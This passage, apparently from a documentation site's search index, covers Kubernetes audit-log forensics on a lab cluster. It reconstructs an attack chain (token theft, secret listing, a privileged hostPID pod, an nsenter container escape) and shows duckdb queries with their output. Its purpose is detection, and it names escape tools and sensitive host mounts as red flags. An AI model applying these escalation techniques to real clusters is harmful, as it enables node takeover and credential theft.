(<code>system:serviceaccount:payments:visa-processor</code>), we don't need to run individual detection scripts for every possible attack vector. We can simply ask the audit log: 'What did this user do?'</p> <pre><code>audit_track_user_activity logs/audit.log system:serviceaccount:payments:visa-processor\n</code></pre> <p>The Finding: The output reveals the entire Kill Chain in chronological order:</p> <ol> <li>Reconnaissance: <code>create selfsubjectaccessreviews</code>. The attacker checked their own permissions.</li> <li>Credential Harvesting: <code>list secrets</code>. The attacker dumped all secrets in the cluster.</li> <li>Privilege Escalation: <code>create pods</code>. The attacker created a pod named <code>visa-processor</code> in the <code>payments-v2</code> namespace.</li> <li>Lateral Movement/Persistence: <code>create pods/exec</code>. The attacker opened an interactive shell into that pod.</li> </ol> <p>This single command confirms the attacker moved from simple discovery to active exploitation and established a backdoor.</p> <p>This led to the final, critical chapter of the investigation: The Node Compromise.</p>"},{"location":"auditing/audit-log-Investigation/#step-3-the-node-takeover","title":"Step 3: The Node Takeover","text":"<p>Note: The following forensic analysis assumes that your audit log profile is set to capture request bodies (e.g., <code>WriteRequestBodies</code> or <code>AllRequestBodies</code>). Without this, you will not see the full pod spec, container image, or command in the audit log. Since pods are often short-lived, other methods (such as external SIEM, EDR, or node-level forensics) are required to reconstruct the attack if audit bodies are not available.</p> <p>At this stage, the attacker has achieved a privileged foothold inside the <code>visa-processor</code> pod, which was created with both <code>hostPID: true</code> and <code>privileged: true</code>. These settings effectively remove most container boundaries, granting the attacker visibility and control over the host node's processes and resources.</p> <p>The next move is inferred from the pod specification: the attacker likely attempts to escape the container namespace and access the host's filesystem and process space. While we often suspect tools like <code>nsenter</code>, the audit log does not capture what happens inside the container. Instead, we rely on forensic signals from the pod spec:</p> <ul> <li>Pod creation with <code>hostPID</code> and <code>privileged</code>: The audit log shows the creation of a pod with these dangerous settings, a strong indicator of an attempted container escape.</li> <li>Suspicious or unusual commands: If the audit log profile captures request bodies, you can see the full command array used to launch the container. Any command that attempts namespace manipulation (e.g., <code>nsenter</code>, <code>chroot</code>, <code>mount</code>, or custom binaries) is a red flag, but even generic shells (<code>/bin/bash</code>, <code>/bin/sh</code>) in privileged pods should be scrutinized.</li> <li>Container image used: The audit log also reveals the image specified for the pod. Unusual or minimal images (like <code>alpine</code>, <code>busybox</code>), or images not normally used in your environment, can indicate attacker activity or attempts to evade detection.</li> <li>Sensitive hostPath mounts: The attacker may also mount critical host directories (like <code>/</code>, <code>/etc</code>, <code>/var/run</code>, <code>/root</code>, or <code>/etc/kubernetes</code>) into the pod, providing direct access to the node's files.</li> </ul> <p>By reviewing the pod spec in the audit log, you can: * See the exact container image and command used, providing context for the attacker's intent and tooling\u2014without needing to guess the method (e.g., <code>nsenter</code>). * Correlate suspicious images and commands with dangerous settings (<code>hostPID</code>, <code>privileged</code>, sensitive hostPath mounts) to build a high-confidence picture of a node compromise attempt.</p> <p>Once on the node, the attacker can: * Read or modify sensitive files. * Create or alter static pod manifests for persistence. * Access container runtime sockets to control other containers or escalate further. * etc..</p> <p>Forensic Implications: While the actual use of escape tools and subsequent host actions are not visible in Kubernetes audit logs, the combination of these pod creation events, dangerous settings, suspicious commands, unusual images, and sensitive mounts is a high-fidelity signal of node compromise. The queries below help you spot these behaviors.</p> <pre><code>POD_NAME=\"visa-processor\"\naudit_track_pod_lifecycle logs/audit.log $POD_NAME\n</code></pre> <p>The Finding: We see the pod created with a command that explicitly invokes <code>nsenter</code>, confirming the attacker's intent to escape the container and access the host.</p>"},{"location":"auditing/audit-log-Investigation/#forensic-timeline","title":"Forensic Timeline","text":"<p>We have now reconstructed the entire Kill Chain, from the first failed probe to total infrastructure compromise.</p> <pre><code>flowchart TD\n    %% Define Styles\n    classDef frontend fill:#ffebee,stroke:#c62828,stroke-width:2px;\n    classDef lateral fill:#fff3e0,stroke:#ef6c00,stroke-width:2px;\n    classDef escalation fill:#e8f5e9,stroke:#2e7d32,stroke-width:2px;\n    classDef takeover fill:#212121,stroke:#000,stroke-width:2px,color:#fff;\n\n    subgraph Phase1 [\"Phase 1: The Noisy Neighbor\"]\n        A[\"Log: asset-cache gets 403 Forbidden\"]:::frontend\n        Note1[\"Attacker has RCE but no permissions\"]\n    end\n\n    subgraph Phase2 [\"Phase 2: Lateral Movement\"]\n        B[\"Log: visa-processor checks SelfPermissions\"]:::lateral\n        C[\"Log: visa-processor Lists Secrets\"]:::lateral\n        Note2[\"Token stolen &amp; credential harvesting\"]\n    end\n\n    subgraph Phase3 [\"Phase 3: Escalation\"]\n        D[\"Log: visa-processor creates pod fake visa-processor (HostPID)\"]:::escalation\n        E[\"Log: visa-processor execs into fake visa-processor\"]:::escalation\n        Note3[\"Container Escape &amp; Privileged Access\"]\n    end\n\n    subgraph Phase4 [\"Phase 4: Impact\"]\n        F[\"Log: Fake visa-processor access Host Namespace\"]:::takeover\n        Note4[\"Physical Node Compromised\"]\n    end\n\n    A --&gt; B --&gt; C --&gt; D --&gt; E --&gt; F</code></pre>"},{"location":"auditing/audit-log-Investigation/#conclusion","title":"Conclusion","text":"<p>We have reconstructed the crime scene using only the Audit Logs, mapping the attack to the MITRE ATT\\&amp;CK framework:</p> <ol> <li>Asset-Cache (Frontend): <code>403 Forbidden</code> on API calls. Conclusion: Compromised, but contained by RBAC.</li> <li>Visa-Processor (Lateral Move): <code>SelfSubjectAccessReview</code>. Conclusion: Token stolen, Reconnaissance detected.</li> <li>Visa-Processor (Exfiltration): <code>List Secrets</code>. Conclusion: Credential Harvesting.</li> <li>Visa-Processor (Escalation): Deployed <code>fake visa-processor</code> with <code>HostPID</code>. Conclusion: Container Escape.</li> <li>Visa-Processor (Action): Executed shell in <code>fake visa-processor</code>. Conclusion: Node Takeover.</li> </ol>"},{"location":"auditing/duckdb-tests/","title":"Duckdb tests","text":"<p>\u279c  ~ duckdb -c \" SELECT   json_extract_string(objectRef, '$.name') AS Namespace,   requestReceivedTimestamp AS CreationTime,   json_extract_string(responseObject, '$.status.phase') AS Status FROM read_json_auto('audit.log', ignore_errors=true)  WHERE json_extract_string(objectRef, '$.resource') = 'namespaces'   AND verb = 'create' ORDER BY CreationTime; \" \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 Namespace \u2502        CreationTime         \u2502 Status  \u2502 \u2502  varchar  \u2502           varchar           \u2502 varchar \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502 backend   \u2502 2025-12-10T06:29:45.805882Z \u2502 Active  \u2502 \u2502 frontend  \u2502 2025-12-10T06:29:46.148817Z \u2502 Active  \u2502 \u2502 payments  \u2502 2025-12-10T06:29:46.493026Z \u2502 Active  \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u279c  ~ </p> <p>\u279c  ~ duckdb -c \" SELECT   requestReceivedTimestamp AS Time,   json_extract_string(objectRef, '$.resource') AS Kind,   json_extract_string(objectRef, '$.name') AS Name,   json_extract_string(user, '$.username') AS User,   json_extract_string(responseStatus, '$.code') AS Code FROM read_json_auto('audit.log', ignore_errors=true) WHERE json_extract_string(objectRef, '$.namespace') = 'payments'   AND verb = 'create' ORDER BY Time; \" \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502         Time         \u2502         Kind         \u2502                      Name                      \u2502                                          User                                          \u2502  Code   \u2502 \u2502       varchar        \u2502       varchar        \u2502                    varchar                     \u2502                                        varchar                                         \u2502 varchar \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502 2025-12-10T06:29:4\u2026  \u2502 configmaps           \u2502 kube-root-ca.crt                               \u2502 system:serviceaccount:kube-system:root-ca-cert-publisher                               \u2502 201     \u2502 \u2502 2025-12-10T06:29:4\u2026  \u2502 serviceaccounts      \u2502 default                                        \u2502 system:serviceaccount:kube-system:service-account-controller                           \u2502 201     \u2502 \u2502 2025-12-10T06:29:4\u2026  \u2502 configmaps           \u2502 openshift-service-ca.crt                       \u2502 system:serviceaccount:kube-system:service-ca-cert-publisher                            \u2502 201     \u2502 \u2502 2025-12-10T06:29:4\u2026  \u2502 rolebindings         \u2502 system:deployers                               \u2502 system:serviceaccount:openshift-infra:default-rolebindings-controller                  \u2502 201     \u2502 \u2502 2025-12-10T06:29:4\u2026  \u2502 rolebindings         \u2502 system:image-pullers                           \u2502 system:serviceaccount:openshift-infra:default-rolebindings-controller                  \u2502 201     \u2502 \u2502 2025-12-10T06:29:4\u2026  \u2502 serviceaccounts      \u2502 builder                                        \u2502 system:serviceaccount:openshift-infra:serviceaccount-controller                        \u2502 201     \u2502 \u2502 2025-12-10T06:29:4\u2026  \u2502 serviceaccounts      \u2502 deployer                                       \u2502 system:serviceaccount:openshift-infra:serviceaccount-controller                        \u2502 201     \u2502 \u2502 2025-12-10T06:29:4\u2026  \u2502 rolebindings         \u2502 system:image-builders                          \u2502 system:serviceaccount:openshift-infra:default-rolebindings-controller                  \u2502 201     \u2502 \u2502 2025-12-10T06:29:4\u2026  \u2502 serviceaccounts      \u2502 builder                                        \u2502 system:serviceaccount:openshift-infra:serviceaccount-pull-secrets-controller           \u2502 201     \u2502 \u2502 2025-12-10T06:29:4\u2026  \u2502 serviceaccounts      \u2502 deployer                                       \u2502 system:serviceaccount:openshift-infra:serviceaccount-pull-secrets-controller           \u2502 201     \u2502 \u2502 2025-12-10T06:29:4\u2026  \u2502 serviceaccounts      \u2502 default                                        \u2502 system:serviceaccount:kube-system:service-account-controller                           \u2502 409     \u2502 \u2502 2025-12-10T06:29:4\u2026  \u2502 serviceaccounts      \u2502 default                                        \u2502 system:serviceaccount:openshift-infra:serviceaccount-pull-secrets-controller           \u2502 201     \u2502 \u2502 2025-12-10T06:29:4\u2026  \u2502 clusterservicevers\u2026  \u2502 network-observability-operator.v1.10.1         \u2502 system:serviceaccount:openshift-operator-lifecycle-manager:olm-operator-serviceaccount \u2502 201     \u2502 \u2502 2025-12-10T06:29:4\u2026  \u2502 clusterservicevers\u2026  \u2502 compliance-operator.v1.8.0                     \u2502 system:serviceaccount:openshift-operator-lifecycle-manager:olm-operator-serviceaccount \u2502 201     \u2502 \u2502 2025-12-10T06:29:4\u2026  \u2502 clusterservicevers\u2026  \u2502 openshift-pipelines-operator-rh.v1.20.1        \u2502 system:serviceaccount:openshift-operator-lifecycle-manager:olm-operator-serviceaccount \u2502 201     \u2502 \u2502 2025-12-10T06:29:4\u2026  \u2502 clusterservicevers\u2026  \u2502 rhacs-operator.v4.9.1                          \u2502 system:serviceaccount:openshift-operator-lifecycle-manager:olm-operator-serviceaccount \u2502 201     \u2502 \u2502 2025-12-10T06:29:4\u2026  \u2502 serviceaccounts      \u2502 pipeline                                       \u2502 system:serviceaccount:openshift-operators:openshift-pipelines-operator                 \u2502 201     \u2502 \u2502 2025-12-10T06:29:4\u2026  \u2502 serviceaccounts      \u2502 pipeline                                       \u2502 system:serviceaccount:openshift-infra:serviceaccount-pull-secrets-controller           \u2502 201     \u2502 \u2502 2025-12-10T06:29:4\u2026  \u2502 rolebindings         \u2502 pipelines-scc-rolebinding                      \u2502 system:serviceaccount:openshift-operators:openshift-pipelines-operator                 \u2502 201     \u2502 \u2502 2025-12-10T06:29:4\u2026  \u2502 serviceaccounts      \u2502 mastercard-processor                           \u2502 admin                                                                                  \u2502 201     \u2502 \u2502          \u00b7           \u2502  \u00b7                   \u2502          \u00b7                                     \u2502   \u00b7                                                                                    \u2502  \u00b7      \u2502 \u2502          \u00b7           \u2502  \u00b7                   \u2502          \u00b7                                     \u2502   \u00b7                                                                                    \u2502  \u00b7      \u2502 \u2502          \u00b7           \u2502  \u00b7                   \u2502          \u00b7                                     \u2502   \u00b7                                                                                    \u2502  \u00b7      \u2502 \u2502 2025-12-10T06:30:4\u2026  \u2502 pods                 \u2502 gateway-79d69c8875-69zn9                       \u2502 system:kube-scheduler                                                                  \u2502 201     \u2502 \u2502 2025-12-10T06:30:4\u2026  \u2502 events               \u2502 gateway-79d69c8875.187fc6df2c1d1a9e            \u2502 system:serviceaccount:kube-system:replicaset-controller                                \u2502 201     \u2502 \u2502 2025-12-10T06:30:4\u2026  \u2502 events               \u2502 gateway-79d69c8875-69zn9.187fc6df2cbfc8ae      \u2502 system:kube-scheduler                                                                  \u2502 201     \u2502 \u2502 2025-12-10T06:30:4\u2026  \u2502 deployments          \u2502 mastercard-processor                           \u2502 admin                                                                                  \u2502 201     \u2502 \u2502 2025-12-10T06:30:4\u2026  \u2502 events               \u2502 gateway-79d69c8875-69zn9.187fc6df4ae6cb68      \u2502 system:multus:master-1                                                                 \u2502 201     \u2502 \u2502 2025-12-10T06:30:4\u2026  \u2502 replicasets          \u2502 mastercard-processor-59986f994c                \u2502 system:serviceaccount:kube-system:deployment-controller                                \u2502 201     \u2502 \u2502 2025-12-10T06:30:4\u2026  \u2502 pods                 \u2502 NULL                                           \u2502 system:serviceaccount:kube-system:replicaset-controller                                \u2502 201     \u2502 \u2502 2025-12-10T06:30:4\u2026  \u2502 events               \u2502 mastercard-processor.187fc6e03de6b7ef          \u2502 system:serviceaccount:kube-system:deployment-controller                                \u2502 201     \u2502 \u2502 2025-12-10T06:30:4\u2026  \u2502 pods                 \u2502 mastercard-processor-59986f994c-lmwmx          \u2502 system:kube-scheduler                                                                  \u2502 201     \u2502 \u2502 2025-12-10T06:30:4\u2026  \u2502 events               \u2502 mastercard-processor-59986f994c.187fc6e03eb4\u2026  \u2502 system:serviceaccount:kube-system:replicaset-controller                                \u2502 201     \u2502 \u2502 2025-12-10T06:30:4\u2026  \u2502 events               \u2502 mastercard-processor-59986f994c-lmwmx.187fc6\u2026  \u2502 system:kube-scheduler                                                                  \u2502 201     \u2502 \u2502 2025-12-10T06:30:4\u2026  \u2502 deployments          \u2502 visa-processor                                 \u2502 admin                                                                                  \u2502 201     \u2502 \u2502 2025-12-10T06:30:4\u2026  \u2502 replicasets          \u2502 visa-processor-7d57964dc8                      \u2502 system:serviceaccount:kube-system:deployment-controller                                \u2502 201     \u2502 \u2502 2025-12-10T06:30:4\u2026  \u2502 events               \u2502 visa-processor.187fc6e05c52a0f9                \u2502 system:serviceaccount:kube-system:deployment-controller                                \u2502 201     \u2502 \u2502 2025-12-10T06:30:4\u2026  \u2502 pods                 \u2502 NULL                                           \u2502 system:serviceaccount:kube-system:replicaset-controller                                \u2502 201     \u2502 \u2502 2025-12-10T06:30:4\u2026  \u2502 pods                 \u2502 visa-processor-7d57964dc8-brrf7                \u2502 system:kube-scheduler                                                                  \u2502 201     \u2502 \u2502 2025-12-10T06:30:4\u2026  \u2502 events               \u2502 visa-processor-7d57964dc8.187fc6e05f261c24     \u2502 system:serviceaccount:kube-system:replicaset-controller                                \u2502 201     \u2502 \u2502 2025-12-10T06:30:4\u2026  \u2502 events               \u2502 visa-processor-7d57964dc8-brrf7.187fc6e05f79\u2026  \u2502 system:kube-scheduler                                                                  \u2502 201     \u2502 \u2502 2025-12-10T06:30:4\u2026  \u2502 events               \u2502 mastercard-processor-59986f994c-lmwmx.187fc6\u2026  \u2502 system:multus:master-1                                                                 \u2502 201     \u2502 \u2502 2025-12-10T06:30:4\u2026  \u2502 events               \u2502 visa-processor-7d57964dc8-brrf7.187fc6e08145\u2026  \u2502 system:multus:master-1                                                                 \u2502 201     \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502 63 rows (40 shown)                                                                                                                                                                    5 columns \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u279c  ~ </p> <p>\u279c  ~ duckdb -c \" SELECT   json_extract_string(objectRef, '$.name') AS Deployment,   json_extract_string(responseObject, '$.spec.template.spec.containers[0].image') AS Image,   COALESCE(json_extract_string(responseObject, '$.spec.template.spec.serviceAccountName'), 'default') AS ServiceAccount FROM read_json_auto('audit.log', ignore_errors=true) WHERE json_extract_string(objectRef, '$.namespace') = 'payments'   AND json_extract_string(objectRef, '$.resource') = 'deployments'   AND verb = 'create' ORDER BY requestReceivedTimestamp; \" \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502      Deployment      \u2502                  Image                   \u2502    ServiceAccount    \u2502 \u2502       varchar        \u2502                 varchar                  \u2502       varchar        \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502 gateway              \u2502 quay.io/vuln/gateway:v1                  \u2502 default              \u2502 \u2502 mastercard-processor \u2502 quay.io/vuln/mastercard-processor:latest \u2502 mastercard-processor \u2502 \u2502 visa-processor       \u2502 quay.io/vuln/visa-processor:latest       \u2502 visa-processor       \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u279c  ~ </p> <p>\u279c  ~ duckdb -c \" SELECT   json_extract(responseObject, '$') AS FullJson FROM read_json_auto('audit.log', ignore_errors=true) WHERE json_extract_string(objectRef, '$.namespace') = 'payments'   AND json_extract_string(objectRef, '$.resource') = 'deployments'   AND json_extract_string(objectRef, '$.name') = 'gateway'   AND verb = 'create'; \" \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502                                                                                            FullJson                                                                                             \u2502 \u2502                                                                                              json                                                                                               \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502 {\"kind\":\"Deployment\",\"apiVersion\":\"apps/v1\",\"metadata\":{\"name\":\"gateway\",\"namespace\":\"payments\",\"uid\":\"ccd7ab4c-b4f9-4c05-ac24-bacbbf13fa90\",\"resourceVersion\":\"11632574\",\"creationTimestamp\"\u2026  \u2502 